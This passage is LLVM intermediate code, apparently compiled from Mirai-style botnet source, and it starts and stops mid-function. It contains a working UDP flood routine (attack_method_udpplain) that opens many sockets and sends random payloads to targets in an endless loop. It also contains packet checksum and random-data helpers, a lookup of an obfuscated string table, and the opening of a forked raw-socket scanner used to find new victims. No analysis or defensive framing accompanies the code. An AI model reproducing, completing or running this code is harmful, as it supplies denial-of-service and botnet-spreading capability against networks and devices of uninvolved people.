  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %92 = call i32 @inet_addr(i8* noundef %91) #7
  store i32 %92, i32* %1, align 4
  br label %106

93:                                               ; preds = %87
  br label %94

94:                                               ; preds = %93, %15
  br label %95

95:                                               ; preds = %94, %0
  %96 = call i32 @rand_next()
  %97 = urem i32 %96, 4
  switch i32 %97, label %106 [
    i32 0, label %98
    i32 1, label %100
    i32 2, label %102
    i32 3, label %104
  ]

98:                                               ; preds = %95
  %99 = call i32 @htonl(i32 noundef 134744072) #8
  store i32 %99, i32* %1, align 4
  br label %106

100:                                              ; preds = %95
  %101 = call i32 @htonl(i32 noundef 1246898730) #8
  store i32 %101, i32* %1, align 4
  br label %106

102:                                              ; preds = %95
  %103 = call i32 @htonl(i32 noundef 1074151430) #8
  store i32 %103, i32* %1, align 4
  br label %106

104:                                              ; preds = %95
  %105 = call i32 @htonl(i32 noundef 67240450) #8
  store i32 %105, i32* %1, align 4
  br label %106

106:                                              ; preds = %104, %102, %100, %98, %95, %90
  %107 = load i32, i32* %1, align 4
  ret i32 %107
}

declare i32 @open(i8* noundef, i32 noundef, ...) #4

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpplain(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 noundef %24, i64 noundef 8) #7
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 4) #7
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 7, i32 noundef 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 6, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 0, i32 noundef 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 1, i32 noundef 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %47, i8 0, i64 16, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

51:                                               ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

54:                                               ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 noundef zeroext %55) #8
  store i16 %56, i16* %13, align 2
  br label %57

57:                                               ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %170, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %173

63:                                               ; preds = %58
  %64 = call noalias i8* @calloc(i64 noundef 65535, i64 noundef 1) #7
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

72:                                               ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

81:                                               ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 noundef zeroext %82) #8
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

90:                                               ; preds = %81, %72
  %91 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #7
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  ret void

98:                                               ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 noundef %108, %struct.sockaddr* %112, i32 noundef 16) #7
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

115:                                              ; preds = %98
  br label %116

116:                                              ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %151

125:                                              ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 noundef %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = add i32 %132, %141
  %143 = call i32 @htonl(i32 noundef %142) #8
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 0
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %148, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  store i32 %143, i32* %150, align 4
  br label %151

151:                                              ; preds = %125, %116
  %152 = load i32*, i32** %11, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i32, i32* %152, i64 %154
  %156 = load i32, i32* %155, align 4
  %157 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %158 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %158, i64 %160
  %162 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i32 0, i32 0
  %163 = bitcast %struct.sockaddr_in* %162 to %struct.sockaddr*
  store %struct.sockaddr* %163, %struct.sockaddr** %157, align 8
  %164 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %165 = load %struct.sockaddr*, %struct.sockaddr** %164, align 8
  %166 = call i32 @connect(i32 noundef %156, %struct.sockaddr* %165, i32 noundef 16)
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

168:                                              ; preds = %151
  br label %169

169:                                              ; preds = %168, %151
  br label %170

170:                                              ; preds = %169
  %171 = load i32, i32* %9, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %9, align 4
  br label %58, !llvm.loop !35

173:                                              ; preds = %58
  br label %174

174:                                              ; preds = %205, %173
  store i32 0, i32* %9, align 4
  br label %175

175:                                              ; preds = %202, %174
  %176 = load i32, i32* %9, align 4
  %177 = load i8, i8* %5, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp slt i32 %176, %178
  br i1 %179, label %180, label %205

180:                                              ; preds = %175
  %181 = load i8**, i8*** %10, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds i8*, i8** %181, i64 %183
  %185 = load i8*, i8** %184, align 8
  store i8* %185, i8** %22, align 8
  %186 = load i8, i8* %15, align 1
  %187 = icmp ne i8 %186, 0
  br i1 %187, label %188, label %192

188:                                              ; preds = %180
  %189 = load i8*, i8** %22, align 8
  %190 = load i16, i16* %14, align 2
  %191 = zext i16 %190 to i32
  call void @rand_str(i8* noundef %189, i32 noundef %191)
  br label %192

192:                                              ; preds = %188, %180
  %193 = load i32*, i32** %11, align 8
  %194 = load i32, i32* %9, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds i32, i32* %193, i64 %195
  %197 = load i32, i32* %196, align 4
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i64
  %201 = call i64 @send(i32 noundef %197, i8* noundef %198, i64 noundef %200, i32 noundef 16384)
  br label %202

202:                                              ; preds = %192
  %203 = load i32, i32* %9, align 4
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %9, align 4
  br label %175, !llvm.loop !36

205:                                              ; preds = %175
  br label %174
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_generic(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

16:                                               ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6, !llvm.loop !37

19:                                               ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

22:                                               ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

29:                                               ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

23:                                               ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

26:                                               ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23, !llvm.loop !38

36:                                               ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %46

39:                                               ; preds = %36
  %40 = load i16*, i16** %9, align 8
  %41 = bitcast i16* %40 to i8*
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = load i32, i32* %12, align 4
  %45 = add i32 %44, %43
  store i32 %45, i32* %12, align 4
  br label %46

46:                                               ; preds = %39, %36
  %47 = load i32, i32* %10, align 4
  %48 = lshr i32 %47, 16
  %49 = and i32 %48, 65535
  %50 = load i32, i32* %12, align 4
  %51 = add i32 %50, %49
  store i32 %51, i32* %12, align 4
  %52 = load i32, i32* %10, align 4
  %53 = and i32 %52, 65535
  %54 = load i32, i32* %12, align 4
  %55 = add i32 %54, %53
  store i32 %55, i32* %12, align 4
  %56 = load i32, i32* %11, align 4
  %57 = lshr i32 %56, 16
  %58 = and i32 %57, 65535
  %59 = load i32, i32* %12, align 4
  %60 = add i32 %59, %58
  store i32 %60, i32* %12, align 4
  %61 = load i32, i32* %11, align 4
  %62 = and i32 %61, 65535
  %63 = load i32, i32* %12, align 4
  %64 = add i32 %63, %62
  store i32 %64, i32* %12, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 6
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i16
  %69 = call zeroext i16 @htons(i16 noundef zeroext %68) #8
  %70 = zext i16 %69 to i32
  %71 = load i32, i32* %12, align 4
  %72 = add i32 %71, %70
  store i32 %72, i32* %12, align 4
  %73 = load i16, i16* %7, align 2
  %74 = zext i16 %73 to i32
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  br label %77

77:                                               ; preds = %81, %46
  %78 = load i32, i32* %12, align 4
  %79 = lshr i32 %78, 16
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %81, label %87

81:                                               ; preds = %77
  %82 = load i32, i32* %12, align 4
  %83 = and i32 %82, 65535
  %84 = load i32, i32* %12, align 4
  %85 = lshr i32 %84, 16
  %86 = add i32 %83, %85
  store i32 %86, i32* %12, align 4
  br label %77, !llvm.loop !39

87:                                               ; preds = %77
  %88 = load i32, i32* %12, align 4
  %89 = xor i32 %88, -1
  %90 = trunc i32 %89 to i16
  ret i16 %90
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

5:                                                ; preds = %45, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %46

8:                                                ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %21

11:                                               ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = sub i64 %18, 4
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* %4, align 4
  br label %45

21:                                               ; preds = %8
  %22 = load i32, i32* %4, align 4
  %23 = icmp sge i32 %22, 2
  br i1 %23, label %24, label %36

24:                                               ; preds = %21
  %25 = call i32 @rand_next()
  %26 = and i32 %25, 65535
  %27 = trunc i32 %26 to i16
  %28 = load i8*, i8** %3, align 8
  %29 = bitcast i8* %28 to i16*
  store i16 %27, i16* %29, align 2
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 2
  store i8* %31, i8** %3, align 8
  %32 = load i32, i32* %4, align 4
  %33 = sext i32 %32 to i64
  %34 = sub i64 %33, 2
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %4, align 4
  br label %44

36:                                               ; preds = %21
  %37 = call i32 @rand_next()
  %38 = and i32 %37, 255
  %39 = trunc i32 %38 to i8
  %40 = load i8*, i8** %3, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %3, align 8
  store i8 %39, i8* %40, align 1
  %42 = load i32, i32* %4, align 4
  %43 = add nsw i32 %42, -1
  store i32 %43, i32* %4, align 4
  br label %44

44:                                               ; preds = %36, %24
  br label %45

45:                                               ; preds = %44, %11
  br label %5, !llvm.loop !40

46:                                               ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_alpha_str(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 noundef zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %7 = call i8* @table_retrieve_val(i32 noundef 28, i32* noundef null)
  %8 = call i8* @strcpy(i8* noundef %6, i8* noundef %7) #7
  br label %9

9:                                                ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

13:                                               ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %16 = call i32 @util_strlen(i8* noundef %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9, !llvm.loop !41

23:                                               ; preds = %9
  call void @table_lock_val(i8 noundef zeroext 28)
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.21, align 8
  %6 = alloca %struct.fd_set.21, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.22, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set.21*, align 8
  %26 = alloca i32, align 4
  %27 = alloca %struct.fd_set.21*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #7
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  %48 = icmp sgt i32 %47, 0
  br i1 %48, label %52, label %49

49:                                               ; preds = %0
  %50 = load i32, i32* @scanner_pid, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

52:                                               ; preds = %49, %0
  ret void

53:                                               ; preds = %49
  %54 = call i32 @util_local_addr()
  store i32 %54, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %55 = call i64 @time(i64* noundef null) #7
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* @fake_time, align 4
  %57 = call noalias i8* @calloc(i64 noundef 256, i64 noundef 296) #7
  %58 = bitcast i8* %57 to %struct.scanner_connection*
  store %struct.scanner_connection* %58, %struct.scanner_connection** @conn_table, align 8
  store i32 0, i32* %1, align 4
  br label %59

59:                                               ; preds = %73, %53
  %60 = load i32, i32* %1, align 4
  %61 = icmp slt i32 %60, 256
  br i1 %61, label %62, label %76

62:                                               ; preds = %59
  %63 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %64 = load i32, i32* %1, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %63, i64 %65
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 3
  store i32 0, i32* %67, align 8
  %68 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %69 = load i32, i32* %1, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %68, i64 %70
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %71, i32 0, i32 1
  store i32 -1, i32* %72, align 8
  br label %73

73:                                               ; preds = %62
  %74 = load i32, i32* %1, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %1, align 4
  br label %59, !llvm.loop !42

76:                                               ; preds = %59
  %77 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %77, i32* @rsck, align 4
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %79, label %80

79:                                               ; preds = %76
  call void @exit(i32 noundef 0) #9
  unreachable

80:                                               ; preds = %76
  %81 = load i32, i32* @rsck, align 4
  %82 = load i32, i32* @rsck, align 4
  %83 = call i32 (i32, i32, ...) @fcntl(i32 noundef %82, i32 noundef 3, i32 noundef 0)
  %84 = or i32 2048, %83
  %85 = call i32 (i32, i32, ...) @fcntl(i32 noundef %81, i32 noundef 4, i32 noundef %84)
  store i32 1, i32* %1, align 4
  %86 = load i32, i32* @rsck, align 4
  %87 = bitcast i32* %1 to i8*
  %88 = call i32 @setsockopt(i32 noundef %86, i32 noundef 0, i32 noundef 3, i8* noundef %87, i32 noundef 4) #7
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %93

90:                                               ; preds = %80
  %91 = load i32, i32* @rsck, align 4
  %92 = call i32 @close(i32 noundef %91)
  call void @exit(i32 noundef 0) #9
  unreachable

93:                                               ; preds = %80
  br label %94

94:                                               ; preds = %98, %93
  %95 = call i32 @rand_next()
  %96 = and i32 %95, 65535
  %97 = trunc i32 %96 to i16
  store i16 %97, i16* %2, align 2
  br label %98

98:                                               ; preds = %94
  %99 = load i16, i16* %2, align 2
